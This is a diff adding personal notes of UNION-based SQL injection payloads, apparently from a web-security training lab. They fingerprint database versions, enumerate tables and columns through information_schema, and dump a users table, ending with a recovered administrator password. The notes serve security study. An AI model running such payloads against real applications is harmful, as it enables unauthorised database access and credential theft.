@@ -1,0 +1,28 @@
+' order by 1--
+
+' UNION SELECT 'a', 'a'from DUAL--
+'UNION SELEECT banner, NULL from v$version--
+
+
+' order by 1--
+' UNION SELECT 'a','a'#
+' UNION SELECT @@version, NULL# 
+
+' order by 1--
+' UNION SELECT 'a', 'a'--
+' UNION SELECT @@version, NULL--
+' UNION SELECT version(), NULL--
+
+output the list of tablenames on db
+' UNION SELECT table_name, NULL  FROM information_schema.tables--
+users_uloigl
+output the column name, NULL frm information system
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_uloigl'--
+
+username_terlon
+password_okvmvc
+
+6- output username and passwords
+' UNION SELECT username_terlon, password_okvmvc from users_uloigl--
+administrator
+5prw49tsaqpbdxhujdjo
